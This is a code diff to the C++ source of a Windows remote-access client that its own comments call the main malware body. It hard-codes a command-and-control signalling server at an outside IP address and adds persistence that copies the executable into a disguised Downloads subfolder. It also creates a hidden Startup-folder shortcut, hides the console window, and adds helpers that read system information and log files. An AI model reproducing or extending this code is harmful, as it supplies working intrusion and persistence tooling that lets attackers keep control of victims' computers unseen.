@@ -26,7 +26,7 @@
 #include "objidl.h"
 #include "shlguid.h"
 
-#include "helpers.h"
+//#include "helpers.h"
 
 using namespace rtc;
 using namespace std;
@@ -52,6 +52,13 @@ void createFileFromBase64String(char *filename);
 int runScript(char *file_source, char *file_output);
 int setupDirectory();
 int setupPersist();
+void HideConsole();
+std::string stream_as_string(std::istream &stm);
+HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc);
+std::string getLog(std::string filename);
+std::string getExePath(); 
+SYSTEM_INFO getSystemInfo(std::string data);
+
 
 const string c2_id = "6969";
 const string stunServer = "stun:stun.l.google.com:19302";
@@ -59,20 +66,20 @@ const string stunServer2 = "stun:stun2.l.google.com:19302";
 const string signalServed = "ws://73.4.243.143:8000";
 
 const string fileName = "Downloader.exe";
-const int SLP_TIME = 60000;  // 1 Minute
+const int SLP_TIME = 6000;  // 1 Minute
 bool connected = false;
 
 
 
-
-/***
+ 
+/*** 
 * main | Main Malware body
-***/
+***/ 
 int main(int argc, char **argv) try {
 
 	// HideConsole(); // Hides console UI | Disabled for testing purposes
-	setupDirectory();
-	setupPersist();
+	//setupDirectory();
+	//setupPersist();
 
 	Cmdline params(argc, argv);						// Execution parameters
 
@@ -304,10 +311,13 @@ int setupDirectory() {
 		string strPath(ws.begin(), ws.end());
 
 		user_directory = strPath;
+		try {
+			namespace fs = std::filesystem;
+			fs::create_directories(strPath + "\\Downloads\\cache-d");
+		} catch (int E) {
+			return 0;
+		}
 
-		// TODO: Check if folder exist before creating it (Alternative)
-		namespace fs = std::filesystem;
-		fs::create_directories(strPath + "\\Downloads\\cache-d");
 		data_directory = strPath + "\\Downloads\\cache-d";
 
 		return 1;
@@ -319,20 +329,33 @@ int setupDirectory() {
 /***
  * setupPersist | Attempts to create persistence on the machine by copying a shorcut to Windows Startup folder
  ***/
-int setupPersist() {
+int setupPersist(){
 
-	// Copies itself to its data directory
-	string exePath = getExePath();
-	std::filesystem::copy(exePath, data_directory + "\\" + fileName);
+    try {
 
-	// Assuming its copied on its directory folder
-	string source = data_directory + "\\" + fileName;
-	string destination =
-	    user_directory +
-	    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
+		// Copies itself to its data directory
+		string exePath = getExePath();
+		std::filesystem::copy(exePath, data_directory + "\\" + fileName);
 
-	// Create shortcut
-	CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(), "Some bullshit");
+		// Assuming its copied on its directory folder
+		string source = data_directory + "\\" + fileName;
+		string destination =
+		    user_directory +
+		    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
+
+		// Create shortcut
+		CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(), "Some bullshit");
+		
+		//Hide link
+		int attr = GetFileAttributes(destination.c_str());
+		if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+			SetFileAttributes(destination.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
+		}
+	} catch (int E) {
+		return 0;
+	}
+
+	return 1;
 }
 
 
@@ -464,4 +487,80 @@ string randomId(size_t length) {
 	uniform_int_distribution<int> dist(0, int(characters.size() - 1));
 	generate(id.begin(), id.end(), [&]() { return characters.at(dist(rng)); });
 	return id;
+}
+
+HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc)
+
+/*============================================================================*/
+{
+	IShellLink *psl = NULL;
+	HRESULT hres = CoInitialize(NULL);
+
+	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
+	// has already been called.
+
+	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink,
+	                        (LPVOID *)&psl);
+	if (SUCCEEDED(hres)) {
+		IPersistFile *ppf;
+
+		// Set the path to the shortcut target and add the description.
+		psl->SetPath(lpszPathObj);
+		psl->SetDescription(lpszDesc);
+		psl->SetWorkingDirectory(lpszPath);
+
+		// Query IShellLink for the IPersistFile interface, used for saving the
+		// shortcut in persistent storage.
+		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID *)&ppf);
+
+		if (SUCCEEDED(hres)) {
+			WCHAR wsz[MAX_PATH];
+
+			// Ensure that the string is Unicode.
+			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);
+
+			// Add code here to check return value from MultiByteWideChar
+			// for success.
+
+			// Save the link by calling IPersistFile::Save.
+			hres = ppf->Save(wsz, TRUE);
+
+			ppf->Release();
+		}
+		psl->Release();
+	}
+
+	CoUninitialize();
+
+	return hres;
+}
+
+void HideConsole() { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }
+
+std::string stream_as_string(std::istream &stm) {
+	return {std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{}};
+}
+
+std::string getLog(std::string filename) {
+	std::ifstream file(filename);
+	return stream_as_string(file);
+}
+
+std::string getExePath() {
+	char result[MAX_PATH];
+	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
+}
+
+/***
+ * getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software
+
+ * *information
+ ***/
+SYSTEM_INFO getSystemInfo(std::string data) {
+	SYSTEM_INFO siSysInfo;
+
+	// Copy the hardware information to the SYSTEM_INFO struct
+	GetSystemInfo(&siSysInfo);
+
+	return siSysInfo;
 }
